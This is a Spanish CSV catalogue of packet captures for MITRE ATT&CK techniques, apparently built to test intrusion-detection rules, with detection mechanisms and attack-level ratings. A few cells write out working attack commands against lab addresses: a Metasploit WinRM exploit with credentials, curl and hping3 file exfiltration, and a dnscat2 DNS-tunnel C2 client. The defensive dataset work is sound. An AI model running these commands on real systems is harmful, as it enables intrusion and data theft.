TÁCTICA,OTRAS TÁCTICAS,ID TÁCTICA,TÉCNICA,ID TÉCNICA,SUBTÉCNICA,ID SUBTÉCNICA,ATAQUE,HERRAMIENTA,FICHERO PCAP,PROTOCOLO BASE DE ATAQUE,Nº TOTAL DE FLUJOS,Nº DE FLUJOS CON ATAQUE/S,Nº DE FLUJOS CON ATAQUE/S COLATERAL/ES,Nº DE MENSAJES DE RED CON ATAQUE/S,Nº ATAQUES (INSTANCIAS) TOTALES,Nº ATAQUES (INSTANCIAS) PRINCIPALES,Nº ATAQUES (INSTANCIAS) COLATERALES,ATAQUE/S COLATERAL/ES - EXPLICACIÓN,DETECTABLE POR PATRONES,MECANISMO DE DETECCIÓN,DETALLES DE IMPLEMENTACIÓN DE ATAQUE,PROCESO DE GENERACIÓN DE PCAP,VALIDACIÓN DE PCAP,ANÁLISIS DE DETECCIONES DE PCAP (Snort),FORMATO PCAPNG,DETECTABILIDAD,ATAQUES COLATERALES,VERIFICACIÓN MTU MÁXIMA,ERROR TCP_REPLAY,CONTIENE SÓLO FLUJOS COMPLETOS CON SYN INICIAL,NIVEL DE ATAQUE (Contexto de Ataque),JUSTIFICACIÓN NIVEL DE ATAQUE (Contexto de Ataque),NIVEL DE ATAQUE (MODELO OSI),TRAMAS > 4000 Bytes,USADO PARA CÁLCULO DE CAPACIDAD DE DETECCIÓN
Command and Control,-,TA0040,Data Obfuscation,T1001,Steganography,T1001.002,Inserción de información confidencial en una imagen JPG,"Covenant, SSH, scp, Powershell",T1001.002-Data_obfuscation_steganography_[4].pcapng,SSH,1,1,0,1,1,1,0,-,NO,"Detección por anomalías y/o estegoanálisis, envío de imágenes o ficheros con formato poco común entre equipos, existencia de ficheros comprimidos sospechosos, etc.",-,Manual [4] / 3.18,Manual [4] / B.18,Manual [4] / 4.18,1,1,0,1,0,1,LV1,El uso de técnicas esteganográficas para ocultar datos es unívoca. No puede confundirse con actividad legítima,L3,0,0
Command and Control,-,TA0040,Data Obfuscation,T1001,Protocol Impersonation,T1001.003,Falsificación de protocolos de conexión segura como SSL o TLS,FakeTLS (raykaryshyn Github),T1001.003-Data_obfuscation_protocol_impersonation_[4].pcapng,TLS,1,1,0,1,1,1,0,-,SI,Regla genérica que analice el contenido y la estructura de los paquetes enviados para detectar una falsificación de protocolo. Adicionalmente se puede detectar con una regla personalizada que compruebe el campo Server Name y mediante DNS asegure si se corresponde con la dirección IP a la que se está accediendo.,-,Manual [4] / 3.17,Manual [4] / B.17,Manual [4] / 4.17,1,1,0,1,0,1,LV1,La falsificación del protocolo TLS para acceder al equipo víctima es únivoca. No puede confundirse con actividad legítima.,L3,0,1
Credential Access,-,TA0006,OS Credential Dumping,T1003,DCSync,T1003.006,Obtención de credenciales del usuario krbtgt (Usuario Kerberos Active Directory),mimikazt,T1003-Os_credential_dumping_dcsync_[4].pcapng,DCERPC,3,1,0,1,1,1,0,-,SI,Regla compuesta que detecte una llamada DCERPC Bind a la API DRSUAPI seguida de una llamada a la función DsGetNCChanges,-,Manual [4] / 3.11,Manual [4] / B.11,Manual [4] / 4.11,1,1,0,1,0,1,LV1,La obtención de credenciales del usuario krbtgt de manera no autorizada supone siempre un ataque,L3,0,1
Command and Control,-,TA0040,Fallback Channels,T1008,-,-,Traspaso de canal primario C2 a canal alternativo,Covenant,T1008-Fallback_channels_[4].pcapng,SMB2,6,2,1,2,3,2,1,Establecimiento del canal C&C primario mediante Covenant - Command and Control,SI*,"La detección de la creación del canal es posible para este caso concreto, en el que el cortafuegos detecta la creación de ambos canales. Sin embargo, si ambos canales, tanto primario como secundario están establecidos, y no se ha detectado su creación, el cambio de uno a otro es inapreciable por el cortafuegos.",-,Manual [4] / 3.19,Manual [4] / B.19,Manual [4] / 4.19,1,1,0,1,0,1,LV1,La creación de un canal secundario de C&C siempre es un ataque,L3,1,1
Exfiltration,-,TA0010,Exfiltration Over Other Network Medium,T1011,Exfiltration Over Bluetooth,T1011.001,Extracción via Bluetooth,"Covenant, btobex, Bluetooth",T1011-Exfiltration_over_bluetooth_[4].pcapng,BLUETOOTH,1,1,0,1,1,1,0,-,NO,Detección por anomalías en red Bluetooth. Envío y/o recepción de información comprometida por la red Bluetooth,-,Manual [4] / 3.23,Manual [4] / B.23,Manual [4] / 4.23,1,1,0,1,1,1,LV2,El uso de Bluetooth para extraer datos puede darse en contextos legítimos,L2,1,0
Discovery,-,TA0007,Remote System Discovery,T1018,-,-,Descubrimiento de servicios y puertos,nmap,T1018-service_discovery_[3].pcapng,TCP,1002,1002,0,1002,1002,1002,0,-,SI,Regla que detecte envío de mútliples peticiones a un rango de puertos en un tiempo determinado,-,Manual [3] / 3.8.1,Manual [3] / 3.8.1.4,Manual [3] / 3.8.1.5,1,1,0,1,0,1,LV1,"El descubrimiento de servicios, de forma general, se califica como ataque",L3,0,1
Exfiltration,-,TA0010,Automated Exfiltration,T1020,Traffic Duplication,T1020.001,Ejecución de script en Python para activar el reenvío de paquetes en el equipo víctima,"SSH, Scapy",T1020.001-Automated_exfiltration_traffic_duplication_[4].pcapng,SSH,26,1,0,1,1,1,0,-,NO,Detección por anomalías en red que detecte el envío duplicado de paquetes procedentes de un mismo origen interno a la organización,-,Manual [4] / 3.24,Manual [4] / B.24,Manual [4] / 4.24,1,1,0,1,0,1,LV1,La ejecución de un script que habilite el reenvío de paquetes en el equipo víctima es un ataque,L3,0,0
Lateral Movement,-,TA0008,Remote Services,T1021,SSH,T1021.004,Sesión SSH,SSH,T1021-remote_services_ssh_[3].pcapng,SSH,1,1,0,1,1,1,0,-,SI*,"Regla genérica para detectar conexiones SSH entre un orígen y un servidor o destino dentro de la red a proteger. *Este ataque, si bien es detectable por red, es idéntico a un acceso legítimo, por lo que no es posible diferenciar uno de otro (salvo por anomalías relacionadas con direcciones IP o usuarios poco comunes)",-,Manual [3] / 3.8.10,Manual [3] / 3.8.10.4,Manual [4] / 4.1.48,1,1,0,1,0,1,LV2,"El uso de SSH es genérico, no siempre tiene que tratarse de un ataque",L3,0,1
Exfiltration,-,TA0010,Scheduled Transfer,T1029,-,-,Comunicación C2 para el establecimiento de extracción programada,"Covenant, Powershell",T1029-Scheduled_transfer_[4].pcapng,HTTP,9,1,1,1,2,1,1,Establecimiento del canal C&C para la programación de la transferencia - Command and Control,NO,"Detección por anomalías, basada en el descubrimiento de eventos programados que no han sido creados por el usuario.",-,Manual [4] / 3.25,Manual [4] / B.25,Manual [4] / 4.25,1,1,0,1,0,1,LV1,La programación de una exfiltración de datos es siempre un ataque,L3,1,0
Exfiltration,-,TA0010,Data Transfer Size Limits,T1030,-,-,Dividir archivos para realizar transferencias menores a un umbral que provoque alertas,"ftp, split",T1030-Transfer_Size_Limits_[5].pcapng,FTP,68,1,1,1,2,1,1,"En el proceso de ataque se hace uso de un Shell Remoto, pero no es la función principal",NO**,"Dependiendo la forma en la que se envien los archivos, puede ser indetectable. Sin embargo, si utiliza protocolos de transferencia de ficheros (FTP,SMB...) resulta importante monitorizar transferencias con un mismo tamaño de manera concurrente","Transferencia de ficheros mediante FTP, previamente divididos en paquetes de un tamaño constante",Manual [5] / 4.9.1,Manual [5] / C.1,Manual [5] / 5.12.5,1,1,0,1,0,1,LV2,La división en partes para la transferencia de un fichero no necesariamente es un ataque,L3,1,0
Discovery,-,TA0007,System Owner,T1033,-,-,Descubrimiento de sesión de usuario en equipo remoto,"quser, qwinsta",T1033-System_owner_[4].pcapng,DCERPC,13,1,0,1,1,1,0,-,SI,Regla que detecte múltiples interacciones con la API LSM_API_service del servicio RPC desde el mismo equipo origen.,-,Manual [4] / 3.12,Manual [4] / B.12,Manual [4] / 4.12,1,1,0,1,0,1,LV2,El descubrimiento de sesión del usuario en un equipo remoto puede tratarse de una actividad legítima en ciertos contextos,L3,0,1
Collection,-,TA0009,Data from Network Shared Drive,T1039,-,-,Descarga de archivos de interés disponibles en una red compartida,Comando Net Use,T1039-Data_from_network_shared_drive_[4].pcapng,SMB2,3,1,0,1,1,1,0,-,NO,"Detección por anomalías, copia repentina de ficheros compartidos por red.",-,Manual [4] / 3.15,Manual [4] / B.15,Manual [4] / 4.15,1,1,0,1,0,1,LV2,La extracción de datos de un disco compartido es legítimo en según qué contextos,L3,0,1
Credential Access,Discovery,TA0006,Network Sniffing,T1040,-,-,Falsa autenticación,Suite aircrack-ng,T1040-Autenticacion_[1].pcapng,802.11,1,1,0,1,1,1,0,-,NO,No existe detección posible ante este tipo de ataques. El uso de cifrado WEP incorpora vulnerabilidades intrínsecas a este.,-,Manual [1] / 4.2.1,Manual [1] / E.20,Manual [4] / 4.1.26,1,0,0,1,1,1,LV1,El acceso vía falsa autenticación siempre es un ataque,L2 (WEP),0,0
Credential Access,Discovery,TA0006,Network Sniffing,T1040,-,-,ChopChop,Suite aircrack-ng,T1040-Chopchop_[1].pcapng,802.11,1,1,0,1,1,1,0,-,NO,No existe detección posible ante este tipo de ataques. El uso de cifrado WEP incorpora vulnerabilidades intrínsecas a este.,-,Manual [1] / 4.2.2,Manual [1] / E.21,Manual [4] / 4.1.27,1,0,0,1,1,1,LV1,El uso de la técnica ChopChop siempre es un ataque,L2 (WEP),0,0
Credential Access,Discovery,TA0006,Network Sniffing,T1040,-,-,Fragmentación,Suite aircrack-ng,T1040-Fragmentacion_[1].pcapng,802.11,1,1,0,1,1,1,0,-,NO,No existe detección posible ante este tipo de ataques. El uso de cifrado WEP incorpora vulnerabilidades intrínsecas a este.,-,Manual [1] / 4.2.3,Manual [1] / E.22,Manual [4] / 4.1.28,1,0,0,1,1,1,LV1,El uso de la técnica Fragmentacion siempre es un ataque,L2 (WEP),0,0
Credential Access,Discovery,TA0006,Network Sniffing,T1040,-,-,Inundación MAC,Suite aircrack-ng,T1040-Mac_flood_[1].pcapng,IPv4,10674,10674,0,10683,10683,10683,0,-,NO*,"Regla personalizada que detecte un envío masivo de mensajes IPv4 con direcciones incorreladas con la red a proteger, y que aparenten ser completamente aleatorias",-,Manual [1] / 3.2,Manual [1] / E.1,Manual [4] / 4.1.29,1,1,0,1,1,1,LV1,Una inundacion MAC siempre es un ataque,L2 (Switch),0,0
Exfiltration,-,TA0010,Exfiltration Over C2 Channel,T1041,-,-,Exfiltración por canal C2,Caldera,T1041-exfiltration_over_c2_channel_[3].pcapng,HTTP,2,1,0,5,5,5,0,-,NO,Detección por anomalías basada en la sospecha de una extracción de información confidencial por un posible canal C2,-,Manual [3] / 3.8.14,Manual [3] / 3.8.14.4,Manual [3] / 3.8.14.5,1,1,0,1,0,0,LV1,La exfiltración de datos por un canal C2 siempre es un ataque,L3,0,1
Discovery,-,TA0007,Network Service Discovery,T1046,-,-,"Mútliples actividades de escaneo, incluidas el intento de Shell Remoto aprovechando el conocimiento de la red victima","Low Orbit Ion Canon (LOIC) for UDP, TCP, or HTTP requests",T1046-C2018_[6].pcapng,-,5,1,1,1,2,1,1,Shell Remoto - T1071,NO**,"En determinadas circunstancias, si el envío de paquetes constituye una amenaza de denegación de servicio, podría detectarse el envío masivo de paquetes",-,Dataset CIC-2018,Manual [4] / B.31,Dataset CIC-2018,1,1,0,1,0,1,LV1,Las actividades de escaneo son ataques,L3,0,0
Discovery,-,TA0007,Network Service Discovery,T1046,-,-,Descubrimiento de servicios y version,Nikto,T1046-Version_services_detection1_[3].pcapng,HTTP,160,159,0,6293,6293,6293,0,-,SI,"Múltiples mecanismos. Por ejemplo, regla que detecte un escaneo de puertos (alto número de peticiones hacia un rango de puertos en poco tiempo)",-,Manual [3] / 3.8.3,Manual [3] / 3.8.3.4,Manual [3] / 3.8.3.5,1,1,0,1,0,1,LV1,El descubrimiento de servicios y versiones se considera como ataque,L3,1,1
Discovery,-,TA0007,Network Service Discovery,T1046,-,-,Descubrimiento de servicios y version,nmap,T1046-Version_services_detection2_[3].pcapng,-,65681,65680,0,65737,65737,65737,0,-,SI,"Múltiples mecanismos. Por ejemplo, regla que detecte un escaneo de puertos (alto número de peticiones hacia un rango de puertos en poco tiempo)",-,Manual [3] / 3.8.3,Manual [3] / 3.8.3.4,Manual [3] / 3.8.3.5,1,1,0,1,0,0,LV1,El descubrimiento de servicios y versiones se considera como ataque,L3,0,1
Execution,-,TA0002,Windows Management Instrumentation,T1047,-,-,Ejecución de carga por WinRM,Metasploit,T1047-WinRM_[2].pcapng,HTTP,911,450,1,450,451,450,1,Establecimiento de sesión remota mediante Metasploit - T1059,SI,Regla genérica que detecte intento de ejecucion de código shell en un equipo aprovechando vulnerabilidades en WinRM,"Ejecucion de payload en un equipo mediante WinRM. Comando: msfconsole -x ""use exploit/windows/winrm/winrm_script_exec; set RHOSTS 192.168.2.2; set LHOST 192.168.1.3; set LPORT 5555; set username administrator; set password vagrant; set force_vbs true; run -z; sessions -c 'cmdkey /list'; sessions -k 1; exit""",Manual [2] / 3.1.4.1,Manual [4] / B.26,Manual [2] / 4.2.1.5,1,1,0,1,0,1,LV1,El aprovechamiento de la vulnerabilidad de la herramienta WinRM hace que este ataque siempre se comporte como tal (aunque la ejecución de código remoto también pueda darse en contextos legítimos),L3,1,1
Exfiltration,-,TA0010,Exfiltration Over Alternative Protocol,T1048,Exfiltration Over Unencrypted Non-C2 Protocol,T1048.003,Exfiltración por FTP,Caldera,T1048.003-Exfiltration_over_FTP_[3].pcapng,TCP,9,1,0,1,1,1,0,-,SI,Regla genérica que detecte FTP STOR,"Exfiltracion de datos utilizando el protocolo FTP. Utilizando caldera y la operacion Advanced Thief. Comando: curl -T stage_to_steal.tar.gz.gpg ftp://172.16.1.2/VictimDirectory/ --user ""dit:dit""",Manual [3] / 3.8.15,Manual [3] / 3.8.15.4,Manual [3] / 3.8.15.5,1,1,0,1,0,0,LV1,El uso de FTP para enviar datos se corresponde con un ataque,L3,0,1
Exfiltration,-,TA0010,Exfiltration Over Alternative Protocol,T1048,Exfiltration Over Unencrypted Non-C2 Protocol,T1048.003,Exfiltración por ICMP,hping3,T1048.003-Exfiltration_over_ICMP_[2].pcapng,ICMP,1,1,0,1,16,16,0,-,SI,Regla genérica que detecte PING inusual.,"Exfiltracion mediante protocolo ICMP. Envia varios echo Request que contienen como datos el contenido de ese fichero. Comando: echo ""Esto es un exfiltración sobre ICMP"" > file;timeout 15s hping3 --file ./file --data 36 192.168.2.2 --icmp",Manual [2] / 3.2.2.1,Manual [4] / B.27,Manual [2] / 4.2.2.2,1,1,0,1,0,1,LV1,El uso de ICMP para enviar datos se corresponde con un ataque,L3,0,1
Persistence,"Execution, Privilege Escalation",TA0003,Scheduled Task/Job,T1053,At,T1053.002,Ejecución de tarea mediante uso de comando at para programar la hora de la ejecución,"Caldera, At",T1053.002-Scheduled_TaskJob_At_[5].pcapng,HTTP,2,1,1,1,2,1,1,Establecimiento de sesión con herramienta Sandcat - T1059,SI,Regla genérica que detecte el uso de comando At para programar tareas a una determinada hora o momento,"El ataque consiste en ejecutar una orden en el equipo remoto mediante el uso de At, programando la hora de ejecución de dicha orden. De esta forma, puede obtenerse persistencia, por ejemplo.",Manual [5] / 4.3.3,Manual [5] / C.42,Manual [5] / 5.5.5,1,1,1,1,0,1,LV1,La programacion de una tarea no necesariamente tiene porque ser un ataque,L3,1,1
Defense Evasion,-,TA0005,Indicator Removal,T1070,Network Share Connection Removal,T1070.005,Eliminación de conexiones establecidas via Network Share en Windows,Comando Net Use,T1070-Indicator_removal_network_share_connection_removal_[4].pcapng,SMB2,1,1,0,1,1,1,0,-,NO,Detección por anomalías basada en desconexión repentina procedente de una dirección de varios recursos compartidos,-,Manual [4] / 3.8,Manual [4] / B.8,Manual [4] / 4.8,1,1,0,1,0,1,LV2,La eliminación de conexiones establecidas con Network Share de Windows es legítima en ciertos contextos,L3,0,1
Command and Control,-,TA0040,Application Layer Protocol,T1071,DNS,T1071.004,Command - Control via DNS,dnscat2,T1071-Tunel_[1].pcapng,DNS,200,10,0,204,204,204,0,-,SI,Regla genérica que detecta uso de dnscat,"Envio de peticiones DNS como canal de comunicaciones con la víctima. Comando: timeout 15s /root/dnscat2/client/dnscat --dns server=192.168.2.2,port=53 --secret= acabc17b6904a7f8fada4e7f8de4bce8 --no-encryption",Manual [1] / 5.2.3,Manual [1] / E.17,Manual [4] / 4.1.30,1,1,0,1,0,1,LV1,La ocultación de un canal C&C haciendo uso de un tunel DNS siempre es un ataque,L3,0,1
Discovery,-,TA0007,Account Discovery,T1087,Domain Account,T1087.002,Descubrimiento de cuentas de dominio en entorno Active Directory,"Caldera, net",T1087.002-AccountDiscovery_DomainAccount_[5].pcapng,HTTP,2,1,1,2,3,2,1,Establecimiento de sesión con herramienta Sandcat - T1059,SI,Regla genérica que detecte uso de comandos para enumerar los usuarios o grupos del dominio como net user /domain o net group /domain,Ejecución de comandos mediante CMD para enumerar usuarios y grupos del dominio,Manual [5] / 4.6.2,Manual [5] / C.44,Manual [5] / 5.8.6,1,1,1,1,0,1,LV2,El descubrimiento de cuentas de un dominio AD puede confundirse con actividades de un administrador de red,L3,1,1
Command and Control,-,TA0040,Proxy,T1090,Internal Proxy,T1090.001,Uso de Equipo interno como Proxy para el ataque C2,Covenant,T1090-Proxy_internal_proxy_[4].pcapng,HTTP,23,1,1,1,2,1,1,Establecimiento de canal C&C mediante Covenant - Command and Control,NO,"Aunque sí es detectable la conexión C2 directa con el atacante, no existe un mecanismo de detección concreto que pueda identificar el uso de un proxy, más allá de una detección por anomalías, como la repetición de paquetes, dando a entender que un equipo interno está replicando paquetes, y por tanto está actuando como proxy",-,Manual [4] / 3.20,Manual [4] / B.20,Manual [4] / 4.20,1,1,1,1,0,1,LV1,El uso de un equipo interno como Proxy para comunicaciones C&C siempre es ataque,L3,0,0
Command and Control,-,TA0040,Non-Application Layer Protocol,T1095,-,-,Usar un protocolo que no sea de la capa de Aplicacion en el modelo OSI para esconder la conexión de C2. En este caso utilizamos TCP,"Caldera, manx",T1095-Non_Application_Layer_[3].pcapng,TCP,2,1,1,1,2,1,1,Agente Caldera para el establecimiento de la sesión - Command and Control,SI,Regla genérica que detecte el envío de comandos o comunicaciones C&C en puertos no comunes o haciendo uso de servicios distintos de capa de aplicación,Utilizar la herramienta manx de Caldera para crear sesión C2 mediante TCP,Manual [3] / 3.8.13,Manual [3] / 3.8.13.4,Manual [3] / 3.8.13.5,1,1,1,1,0,1,LV1,El uso de un protocolo distinto de capa de aplicación para ataques C&C siempre es un ataque,L3,1,1
Command and Control,-,TA0040,Web Service,T1102,One-Way Communication,T1102.003,Subida de información confidencial a Workspace de Google Drive,"Covenant, Google Drive API",T1102.003-Web_service-one_way_communication_[4].pcapng,TLS,2,1,1,1,2,1,1,Establecimiento de canal C&C mediante Covenant - Command and Control,NO,"Detección por anomalías, observando actividad inusual relacionada con el uso de servicios web (subidas pesadas de información a la nube, comunicación periódica con servidores web concretos, etc)",-,Manual [4] / 3.21,Manual [4] / B.21,Manual [4] / 4.21,1,1,1,1,0,1,LV2,El uso de un servicio Web para subir datos puede confundirse a menudo con actividades legítimas,L3,1,1
Command and Control,-,TA0040,Multi-Stage Channels,T1104,-,-,Sesión Remota + Ataque C2,"RDP, Covenant",T1104-Multi_stage_channels_[4].pcapng,-,1,1,1,1,2,1,1,Establecimiento de canal C&C mediante Covenant - Command and Control,NO,Detección por anomalías. Investigación de las sesiones establecidas en el equipo atacante (siempre que sea posible) para identificar un rastro de otra dirección.,-,Manual [4] / 3.22,Manual [4] / B.22,Manual [4] / 4.22,1,0,1,1,0,1,LV1,El uso de varias fases y frentes de ataque en una comunicación C&C es siempre un ataque,L3,1,0
